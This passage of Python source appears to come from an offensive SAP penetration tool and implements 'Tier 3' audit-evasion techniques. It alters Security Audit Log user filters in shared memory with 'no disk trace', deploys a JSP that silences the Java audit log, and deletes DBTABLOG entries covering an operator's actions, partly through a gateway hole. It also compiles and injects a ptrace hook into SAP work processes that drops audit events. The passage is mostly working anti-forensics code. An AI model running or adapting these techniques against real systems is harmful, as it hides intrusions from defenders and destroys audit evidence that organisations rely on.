                    error=f"fresh legacy read failed: {fresh['error']}")

            rows = fresh["slotinfo"]
            baseline_rows = [dict(r) for r in rows]

            augmented = [{**r, "SLOTNO": str(i + 1).zfill(4)}
                         for i, r in enumerate(rows)]
            target_slots = _normalize_slotnos(slotno, augmented)
            if not target_slots:
                return _wrap_result(
                    technique, False,
                    slotno=str(slotno), hold_seconds=hold_seconds,
                    error="no target slots resolved")

            max_slot = len(rows)
            for s in target_slots:
                idx = int(s) - 1
                if idx < 0 or idx >= max_slot:
                    return _wrap_result(
                        technique, False,
                        slotno=",".join(target_slots),
                        hold_seconds=hold_seconds,
                        error=f"slot {s} out of range (max {max_slot})")

            baseline_unames = {}
            for s in target_slots:
                bu = rows[int(s) - 1].get("UNAME", "")
                if isinstance(bu, bytes):
                    bu = bu.decode("latin1", "replace")
                baseline_unames[s] = str(bu).strip()

            target_indices = {int(s) - 1 for s in target_slots}
            mutated = [dict(r) for r in rows]
            for idx in target_indices:
                mutated[idx]["UNAME"] = replacement_uname

            print(f"[*] {sid}: SAL UNAME narrow (stealth/SHM) — slots "
                  f"{','.join(target_slots)} (baseline UNAMEs "
                  f"{baseline_unames}) → {replacement_uname!r}")

            w = write_legacy_sal_config(conn, mutated, enable="-")
            if not w["ok"]:
                return _wrap_result(
                    technique, False,
                    slotno=",".join(target_slots),
                    hold_seconds=hold_seconds,
                    baseline_unames=baseline_unames,
                    error=f"stealth write failed: {w['error']}")

            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
                  f"UNAME swapped (SHM-only) — holding {hold_seconds}s")

        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: SAL slot(s) {','.join(target_slots)} UNAME "
                f"swapped to {replacement_uname!r} via "
                f"RSAU_UPD_AUDIT_CONFIG (shared-memory only — no disk "
                f"persistence, no SM19 header change)")
        except Exception:
            pass

        try:
            _time.sleep(max(0.0, float(hold_seconds)))
        finally:
            print(f"[*] {sid}: restoring SAL UNAMEs (stealth/SHM)...")
            try:
                with sapmap_rfc._get_connection(node, creds) as conn:
                    r = write_legacy_sal_config(conn, baseline_rows,
                                                 enable="-")
                    if r["ok"]:
                        print(f"[+] {sid}: SAL UNAMEs restored "
                              f"(SHM-only, no disk trace)")
                    else:
                        print(f"[!] {sid}: stealth restore failed: "
                              f"{r['error']}")
            except Exception as re:
                print(f"[!] {sid}: stealth restore exception: {re}")

    try:
        from sapmap_findings import emit_finding
        emit_finding("INFO", sid,
                     f"Tier 3: SAL slot(s) {','.join(target_slots)} "
                     f"UNAME restored (stealth — no disk trace)")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        slotno=",".join(target_slots),
        hold_seconds=hold_seconds,
        baseline_unames=baseline_unames,
        replacement_uname=replacement_uname,
        after_restore="stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only)",
        stealth_mode=True)


def tier3_sal_uname_narrow(state, node, slotno,
                             replacement_uname: str,
                             hold_seconds: float = 5.0,
                             creds=None) -> dict:
    """Swap the UNAME filter of one or more active SAL slots for a
    hold window, then auto-restore.

    The slot stays STATUS='X' (still appears active in SM19) but its
    user-filter no longer matches SAPMAP00.  Only events from users
    whose name matches ``replacement_uname`` are recorded by the slot
    during the window.

    Args:
        slotno: ``"1"``, ``"1,2,3"``, list, or ``"ALL"``.
        replacement_uname: SAL UNAME pattern to install (e.g. an
            operator's real user; SAP* / wildcard support depends on
            the slot's SEL_USER_GEN flag).
        hold_seconds: how long to keep the swap in place.

    Only the stealth writer is attempted.  Fallback to
    RSAU_API_SET_PROFILE is intentionally NOT wired here because the
    UNAME swap is purely a per-slot mutation and the stealth path
    works on every kernel that exposes RSAU_UPD_AUDIT_CONFIG.
    """
    technique = "sal_uname_narrow"
    try:
        assert_evasion_allowed(state, node, technique)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)

    replacement_uname = (replacement_uname or "").strip()
    if not replacement_uname:
        return _wrap_result(
            technique, False,
            slotno=str(slotno), hold_seconds=hold_seconds,
            error="replacement_uname required")

    sid = getattr(node, "sid", "?")
    try:
        stealth = _try_stealth_sal_uname_narrow(
            state, node, sid, slotno, replacement_uname,
            hold_seconds, creds, technique)
        if stealth is not None:
            return stealth
        return _wrap_result(
            technique, False,
            slotno=str(slotno), hold_seconds=hold_seconds,
            error="stealth writer unavailable (legacy RSAU FMs missing)")
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)
    except Exception as e:
        return _wrap_result(
            technique, False, error=f"unexpected: {e!r}",
            slotno=str(slotno), hold_seconds=hold_seconds)


def tier3_capture_baseline_only(state, node, creds=None) -> dict:
    """Standalone baseline capture without invoking any mutation.

    Useful for the GUI's Pre-flight panel — the operator can confirm
    a baseline JSON exists for the target before arming any other
    Tier 3 technique.  Doesn't go through ``evasion_window`` because
    there's nothing to restore.
    """
    technique = "rz11_dynamic_set"   # arbitrary registered id used for the
                                       # gate; nothing actually mutates
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "baseline_capture",
                "error": str(e), "snapshot_loot": ""}

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return {"ok": False, "technique": "baseline_capture",
                "error": "capture returned empty (no params readable)",
                "snapshot_loot": ""}

    # Mark on the session config that a baseline now exists.  This is
    # what unblocks the `require_baseline` check for other techniques.
    try:
        from sapmap_evasion import EvasionConfig
        cfg = EvasionConfig.from_dict(state.evasion or {})
        cfg.baseline_captured_at = snap.captured_at
        state.evasion = cfg.to_dict()
    except Exception as e:
        logger.warning(f"could not persist baseline timestamp: {e}")

    return {"ok": True, "technique": "baseline_capture",
            "sid": snap.sid, "captured_at": snap.captured_at,
            "snapshot_loot": snap.loot_path,
            "param_count": len(snap.params),
            "filter_row_count": len(snap.sal_filter_rows)}


# ---------------------------------------------------------------------------
# Java Security Audit Log suppression
# ---------------------------------------------------------------------------

def tier3_java_sal_suppress(state, node,
                              hold_seconds: float = 30.0) -> dict:
    """Suppress the Java Security Audit Log via deployed LogController JSP.

    Deploys a small JSP that calls ``Category.setEffectiveSeverity(
    Severity.NONE)`` on the 5 SAL subcategories plus the parent
    ``/System/Security/Audit`` category.  Changes are runtime-only
    (JVM heap) — no disk persistence, no NWA change-log entry, auto-
    restored on JVM restart.

    Flow:
      1. Gate check (``--allow-evasion`` + baseline not required since
         the Java baseline is captured via HTTP, not RFC).
      2. Deploy ``logctl.jsp`` (reuses existing CVE-31324 / CTC / telnet
         / GW pipeline).
      3. ``?action=read`` → capture baseline severities.
      4. ``?action=suppress`` → set all to ``Severity.NONE``.
      5. Sleep ``hold_seconds``.
      6. ``?action=restore&baselines=...`` → restore baseline.

    No ``evasion_window`` — the Java function manages its own baseline
    and restore lifecycle directly via HTTP.
    """
    import time as _time
    technique = "java_nwa_severity"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e))

    if "JAVA" not in (getattr(node, "system_type", "") or "").upper():
        return _wrap_result(technique, False,
                             error="not a Java/dual-stack system")

    sid = getattr(node, "sid", "?")

    # Step 1 — deploy the logctl JSP.
    from sap_java_logctl import deploy_logctl_jsp, invoke_logctl, baselines_to_wire

    jsp_url = deploy_logctl_jsp(node)
    if not jsp_url:
        return _wrap_result(technique, False,
                             error="logctl JSP deployment failed")

    # Step 2 — read baseline severities.
    print(f"[*] {sid}: reading Java SAL baseline severities …")
    baseline = invoke_logctl(jsp_url, "read")
    if not baseline["ok"]:
        return _wrap_result(technique, False,
                             error=f"baseline read failed: "
                                    f"{baseline.get('error', '?')}",
                             jsp_url=jsp_url)
    baseline_cats = baseline["categories"]
    print(f"[+] {sid}: baseline captured — "
          f"{len(baseline_cats)} categories:")
    for cat, sev in baseline_cats.items():
        print(f"[+] {sid}:   {cat} = {sev}")

    # Step 3 — suppress.
    print(f"[*] {sid}: suppressing Java SAL (setting Severity.NONE) …")
    suppress = invoke_logctl(jsp_url, "suppress")
    if not suppress["ok"]:
        return _wrap_result(technique, False,
                             error=f"suppress failed: "
                                    f"{suppress.get('error', '?')}",
                             jsp_url=jsp_url,
                             baseline=baseline_cats)
    print(f"[+] {sid}: Java SAL suppressed — "
          f"OK={suppress['suppress_ok']}, FAIL={suppress['suppress_fail']}")

    # Verify the suppress took effect.
    verify = invoke_logctl(jsp_url, "read")
    if verify["ok"]:
        all_none = all(v == 0 or str(v) == "0"
                       for v in verify["categories"].values())
        # Severity.NONE might be a large int, not 0.  Check if all
        # values changed from baseline.
        changed = sum(1 for cat in baseline_cats
                      if verify["categories"].get(cat) != baseline_cats[cat])
        print(f"[+] {sid}: verify-read — {changed}/{len(baseline_cats)} "
              f"categories changed from baseline")
    else:
        print(f"[!] {sid}: verify-read failed: {verify.get('error', '?')}")

    try:
        from sapmap_findings import emit_finding
        emit_finding(
            "INFO", sid,
            f"Tier 3: Java SAL suppressed — {suppress['suppress_ok']} "
            f"categories set to Severity.NONE via LogController API "
            f"(runtime-only, no disk persistence)")
    except Exception:
        pass

    # Step 4 — hold.
    if hold_seconds > 0:
        print(f"[*] {sid}: holding Java SAL suppress for "
              f"{hold_seconds}s …")
        _time.sleep(max(0.0, float(hold_seconds)))

    # Step 5 — restore.
    print(f"[*] {sid}: restoring Java SAL baseline …")
    wire = baselines_to_wire(baseline_cats)
    restore = invoke_logctl(jsp_url, "restore", baselines=wire)
    if restore["ok"]:
        print(f"[+] {sid}: Java SAL restored — "
              f"OK={restore['suppress_ok']}, FAIL={restore['suppress_fail']}")
    else:
        print(f"[!] {sid}: Java SAL restore FAILED: "
              f"{restore.get('error', '?')}")

    # Post-restore verify.
    post_verify = invoke_logctl(jsp_url, "read")
    restored_count = 0
    if post_verify["ok"]:
        for cat, orig_sev in baseline_cats.items():
            if post_verify["categories"].get(cat) == orig_sev:
                restored_count += 1
        print(f"[+] {sid}: post-restore verify — "
              f"{restored_count}/{len(baseline_cats)} categories "
              f"back to baseline")

    try:
        from sapmap_findings import emit_finding
        emit_finding("INFO", sid,
                     f"Tier 3: Java SAL restored — "
                     f"{restored_count}/{len(baseline_cats)} categories "
                     f"back to baseline severity")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        jsp_url=jsp_url,
        baseline=baseline_cats,
        suppress_ok=suppress["suppress_ok"],
        suppress_fail=suppress["suppress_fail"],
        hold_seconds=hold_seconds,
        restore_ok=restore.get("suppress_ok", 0),
        restore_fail=restore.get("suppress_fail", 0),
        restored_count=restored_count,
        baseline_count=len(baseline_cats))


# ---------------------------------------------------------------------------
# DBTABLOG post-hoc purge (Approach C)
# ---------------------------------------------------------------------------

def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
                          tabname_filter=None) -> dict:
    """Post-hoc purge of DBTABLOG entries written during the hold window.

    Strategy: capture ``MAX(LOGID)`` baseline, let logging run normally
    for ``hold_seconds`` (operator drives their actions during this
    window), then ``DELETE FROM DBTABLOG WHERE LOGID > baseline``
    (optionally narrowed by a tabname whitelist).

    Why this is preferable to the DDIC mutation approaches:
      * DBTABLOG is delivery class ``L`` and is itself NOT logged, so
        the DELETE doesn't recurse.
      * No DD09L touch, no DDIF_TABL_ACTIVATE, no transport object.
      * Restore is a no-op — no state was changed; nothing to roll back.

    Self-managed baseline — gate is called with ``require_baseline=False``
    because the DBTABLOG LOGID baseline is technique-specific and lives
    in the result dict, not in the global ``BaselineSnapshot``.
    """
    import time as _time
    technique = "dbtablog_purge"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e))

    if "ABAP" not in (getattr(node, "system_type", "") or "").upper():
        return _wrap_result(technique, False,
                             error="not an ABAP system")

    sid = getattr(node, "sid", "?")
    tabs = list(tabname_filter or [])

    from sap_dbtablog_purge import (read_baseline_timestamp,
                                       purge_dbtablog,
                                       purge_dbtablog_via_gw_hdbsql,
                                       count_dbtablog_since)

    # Step 1 — baseline (sy-datum + sy-uzeit on the SAP server).
    # Captured via RFC regardless of DELETE channel: the SAP server
    # clock is authoritative for LOGDATE/LOGTIME comparison.
    print(f"[*] {sid}: reading DBTABLOG baseline timestamp …")
    base = read_baseline_timestamp(node)
    if not base["ok"]:
        return _wrap_result(technique, False,
                             error=f"baseline read failed: "
                                    f"{base.get('error', '?')}")
    base_date = base["base_date"]
    base_time = base["base_time"]
    print(f"[+] {sid}: baseline = {base_date} {base_time}")

    # Step 2 — hold (operator runs actions here).
    if hold_seconds > 0:
        scope = (f"tables={','.join(tabs)}" if tabs
                 else "scope=all tables")
        print(f"[*] {sid}: holding for {hold_seconds}s — operator "
              f"actions in this window will be purged ({scope}) …")
        _time.sleep(max(0.0, float(hold_seconds)))

    # Step 3 — purge.  Delivery channel selection:
    #   1. GW SAPXPG → hdbsql  (primary on HANA + GW-vulnerable nodes;
    #      bypasses ABAP DBI entirely)
    #   2. RFC_ABAP_INSTALL_AND_RUN  (fallback; works on any DB)
    #
    # GW path is trust-but-verify: the SAPXPG P3 response only
    # reports the hdbsql process exit, not whether the DELETE
    # actually touched any rows.  Schema mismatch, auth failure, or
    # SQL syntax error all produce "process exited" without purging.
    # After every GW success we RFC-count the remaining rows; if
    # non-zero (or the verifier itself errors), we silently fall
    # through to the RFC DELETE path that is guaranteed correct.
    where_txt = (f"LOGDATE/LOGTIME > {base_date} {base_time}")
    is_hana = (getattr(node, "db_type", "") or "").upper() in ("HDB",
                                                                  "HANA")
    use_gw = is_hana and getattr(node, "gw_vulnerable", False)
    purge = None
    if use_gw:
        if tabs:
            print(f"[*] {sid}: GW SAPXPG → hdbsql DELETE "
                  f"WHERE {where_txt} AND TABNAME IN {tabs} …")
        else:
            print(f"[*] {sid}: GW SAPXPG → hdbsql DELETE "
                  f"WHERE {where_txt} (all tables) …")
        gw_purge = purge_dbtablog_via_gw_hdbsql(
            node, base_date, base_time, tabname_filter=tabs)
        if not gw_purge["ok"]:
            print(f"[!] {sid}: GW path failed "
                  f"({gw_purge.get('error', '?')}) — falling back to "
                  f"RFC_ABAP_INSTALL_AND_RUN …")
        else:
            print(f"[*] {sid}: GW DELETE reported success — "
                  f"verifying via RFC count …")
            verify = count_dbtablog_since(
                node, base_date, base_time, tabname_filter=tabs)
            if not verify["ok"]:
                print(f"[!] {sid}: GW verify failed "
                      f"({verify.get('error', '?')}) — falling back "
                      f"to RFC_ABAP_INSTALL_AND_RUN for safety …")
            elif verify["count"] > 0:
                print(f"[!] {sid}: GW DELETE reported success but "
                      f"RFC verify shows {verify['count']} row(s) "
                      f"remain — schema mismatch / auth / SQL "
                      f"error.  Falling back to "
                      f"RFC_ABAP_INSTALL_AND_RUN …")
            else:
                # GW actually purged everything > baseline.
                gw_purge["remaining_count"] = 0
                purge = gw_purge
                print(f"[+] {sid}: GW DELETE verified — 0 rows "
                      f"remain post-baseline")

    if purge is None:
        if tabs:
            print(f"[*] {sid}: RFC_ABAP_INSTALL_AND_RUN DELETE "
                  f"WHERE {where_txt} AND TABNAME IN {tabs} …")
        else:
            print(f"[*] {sid}: RFC_ABAP_INSTALL_AND_RUN DELETE "
                  f"WHERE {where_txt} (all tables) …")
        purge = purge_dbtablog(node, base_date, base_time,
                                tabname_filter=tabs)

    if not purge["ok"]:
        return _wrap_result(technique, False,
                             error=f"purge failed: "
                                    f"{purge.get('error', '?')}",
                             base_date=base_date, base_time=base_time,
                             via=purge.get("via", "?"))

    deleted = purge["deleted_count"]
    via = purge.get("via", "?")
    remaining = purge["remaining_count"]
    if deleted >= 0:
        print(f"[+] {sid}: DBTABLOG purged via {via} — "
              f"{deleted} row(s) deleted, "
              f"{remaining} remaining post-baseline")
    else:
        # GW SAPXPG path — hdbsql row count not exposed in P3 response.
        # Verifier already confirmed remaining_count==0 if we got here.
        print(f"[+] {sid}: DBTABLOG purged via {via} — DELETE "
              f"executed; {remaining} row(s) remain post-baseline "
              f"(hdbsql row count not exposed by SAPXPG)")

    try:
        from sapmap_findings import emit_finding
        scope_txt = (f" (tables: {','.join(tabs)})" if tabs else "")
        count_txt = (f"{deleted} entries deleted" if deleted >= 0
                     else "DELETE executed (count not measured)")
        emit_finding(
            "INFO", sid,
            f"Tier 3: DBTABLOG purged via {via} — {count_txt} "
            f"(> {base_date} {base_time}){scope_txt}")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        base_date=base_date,
        base_time=base_time,
        deleted_count=deleted,
        remaining_count=purge["remaining_count"],
        tabname_filter=tabs,
        hold_seconds=hold_seconds,
        via=via)


# ---------------------------------------------------------------------------
# 4.A.6 — Virtual SAP Death Star (in-memory SAL suppression)
# ---------------------------------------------------------------------------

def tier3_sal_death_star_launch(state, node,
                                  filter_classes: str = "",
                                  target_pid=None,
                                  skip_upload: bool = False,
                                  skip_compile: bool = False,
                                  verbose: bool = True) -> dict:
    """Deploy + launch Julian Petersohn's ``sap_audit_hook`` on ``node``.

    Uploads the vendored C source, compiles it as ``<sid>adm`` on the
    target, finds a disp+work worker PID, and launches the hook in
    ``--suppress`` mode.  From that point on every SAL event matching
    ``filter_classes`` (empty = all classes) is silently dropped across
    the three audit sinks (disk fwrite, DB write_event_to_DB, ETD
    SendEvent) until ``tier3_sal_death_star_stop`` is called.

    The technique persists as a background process on the target — no
    ``evasion_window`` context wraps it.  Cleanup is the operator's
    responsibility via the paired ``_stop`` entry point (or Cleanup All
    Users, which also runs the hook stop).

    Args:
      filter_classes:   Comma-separated SAL event-class list (``AUW``,
                        ``AUW,AU3``, etc.).  Empty → suppress everything
                        the hook sees.
      target_pid:       Force a specific ``disp+work`` PID.  ``None`` →
                        auto-pick the first ``_W<n>`` worker.
      skip_upload:      Reuse ``/tmp/sap_audit_hook.c`` if present.
      skip_compile:     Reuse ``/tmp/sap_audit_hook`` if present.
      verbose:          Pass ``-v`` to the hook (log-file diagnostics).

    Returns a dict carrying the hook PID, worker PID, install paths, and
    filter — the caller (GUI, script) should stash this on the state so
    a paired ``stop`` can find the pidfile.
    """
    technique = "sal_death_star"
    try:
        # No baseline requirement — the C hook restores its own INT3
        # bytes on SIGTERM detach; there is no persistent target state
        # for us to snapshot up-front.
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             hook_pid=None)

    # OS type gate.  The C source uses Linux-specific APIs
    # (process_vm_readv, PTRACE_ATTACH semantics, /proc/<pid>/exe) so
    # Windows targets fall out immediately with a clear reason.
    os_type = (getattr(node, "os_type", "") or "").lower()
    if os_type and os_type not in ("linux", "linux/unix", "unix", "aix"):
        return _wrap_result(
            technique, False,
            error=(f"unsupported OS {os_type!r}: sap_audit_hook uses "
                    "Linux ptrace/procfs APIs — Windows and macOS SAP "
                    "kernels are not supported"),
            hook_pid=None)

    sid = getattr(node, "sid", "?")
    try:
        from sapmap_death_star import (deploy_and_launch, DeathStarError)
    except Exception as e:
        return _wrap_result(technique, False,
                             error=f"death-star module unavailable: {e}",
                             hook_pid=None)

    print(f"[*] {sid}: Tier 3 sal_death_star — deploying "
           f"in-memory SAL suppressor "
           f"(filter={filter_classes or '(all)'})")
    try:
        result = deploy_and_launch(
            node,
            filter_classes=filter_classes,
            target_pid=target_pid,
            skip_upload=skip_upload,
            skip_compile=skip_compile,
            verbose=verbose,
        )
    except DeathStarError as e:
        print(f"[-] {sid}: sal_death_star failed: {e}")
        return _wrap_result(technique, False, error=str(e),
                             hook_pid=None)
    except Exception as e:
        logger.exception("sal_death_star unexpected error")
        return _wrap_result(technique, False,
                             error=f"unexpected error: {e}",
                             hook_pid=None)

    # Stash on the node so paired ``stop`` can find it without the
    # operator having to re-type paths.  Cleared by ``_stop``.
    node._death_star_state = {
        "hook_pid": result["hook_pid"],
        "target_pid": result["target_pid"],
        "target_comm": result["target_comm"],
        "binary_path": result["binary_path"],
        "pidfile_path": result["pidfile_path"],
        "log_path": result["log_path"],
        "filter_classes": result["filter_classes"],
    }
    # Public marker for the GUI — Disarm menu gates on this being > 0
    # so the item only becomes clickable when a hook is actually armed
    # on this node.  Cleared to 0 by ``_stop``.  Serialised via
    # SAPNode.to_dict so it survives state saves/loads.
    try:
        node.death_star_hook_pid = int(result["hook_pid"])
    except (KeyError, TypeError, ValueError):
        node.death_star_hook_pid = 0

    try:
        from sapmap_findings import emit_finding
        # Different message shape depending on whether the operator
        # supplied a specific PID or let the C hook auto-attach to
        # every work-process.  The all-workers case is the normal one
        # since SAP round-robins dialog sessions across the pool.
        if result.get("target_pid"):
            scope = (f"work-process PID {result['target_pid']} "
                      f"({result['target_comm']})")
        else:
            n = result.get("workers_hooked") or 0
            scope = (f"all {n} work-processes on {sid} "
                      f"— every dialog / batch / spool / update PID")
        plant_fails = result.get("plant_fails_count") or 0
        emit_finding(
            "CRITICAL", sid,
            f"Tier 3: Virtual SAP Death Star armed on {sid} — SAL "
            f"events matching {result['filter_classes'] or '(all)'} "
            f"are silently dropped at fwrite/write_event_to_DB/ETD in "
            f"{scope}.  Hook PID "
            f"{result['hook_pid']} on the target; stop with the "
            f"paired Disarm action or SIGTERM to restore INT3 bytes.")
        # If plant_bp refused to patch on any site (kernel-build offset
        # mismatch), surface a distinct WARNING finding so the operator
        # can't miss the "hook attached but not fully intercepting"
        # state.  When this fires, some SAL events will still land in
        # SM20 — exactly what the operator saw on the S/4 793 target.
        if plant_fails > 0:
            emit_finding(
                "WARNING", sid,
                f"Tier 3: Death Star hook PID {result['hook_pid']} "
                f"attached to {result.get('attach_ok_count', '?')} work-"
                f"process(es) but plant_bp refused {plant_fails} hook "
                f"site(s) — this kernel build's ``rsauwr1ex`` layout "
                f"doesn't match the runtime address scan.  SAL events "
                f"routed through the un-planted sinks WILL still appear "
                f"in SM20.  Full hook log: {result.get('log_path')}")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        hook_pid=result["hook_pid"],
        target_pid=result["target_pid"],
        target_comm=result["target_comm"],
        binary_path=result["binary_path"],
        pidfile_path=result["pidfile_path"],
        log_path=result["log_path"],
        filter_classes=result["filter_classes"],
    )


def tier3_sal_death_star_stop(state, node) -> dict:
    """SIGTERM the death-star hook.  The hook's SIGTERM handler calls
    ``detach_all()`` which restores every INT3 byte and releases ptrace
    on each attached ``disp+work`` worker — a clean disarm.

    Idempotent: safe to call even when no hook is running; returns
    ``ok=False`` with a "nothing to stop" message in that case rather
    than raising.
    """
    technique = "sal_death_star"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e))

    sid = getattr(node, "sid", "?")
    stash = getattr(node, "_death_star_state", None) or {}

    try:
        from sapmap_death_star import stop
    except Exception as e:
        return _wrap_result(technique, False,
                             error=f"death-star module unavailable: {e}")

    print(f"[*] {sid}: Tier 3 sal_death_star — disarming "
           f"(SIGTERM → detach_all → INT3 restore)")
    r = stop(node,
              pidfile_path=stash.get("pidfile_path"),
              binary_path=stash.get("binary_path"))

    # Clear the stash on success so a subsequent launch starts clean.
    if r.get("ok"):
        try:
            delattr(node, "_death_star_state")
        except AttributeError:
            pass
        # Public marker → 0 so the GUI's Disarm menu greys out again.
        node.death_star_hook_pid = 0
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "INFO", sid,
                f"Tier 3: Virtual SAP Death Star disarmed on {sid} — "
                f"hook PID {r.get('pid')} SIGTERM'd, INT3 bytes "
                f"restored, ptrace detached.")
        except Exception:
            pass

    return _wrap_result(technique, r.get("ok", False),
                         message=r.get("message", ""),
                         hook_pid=r.get("pid"))
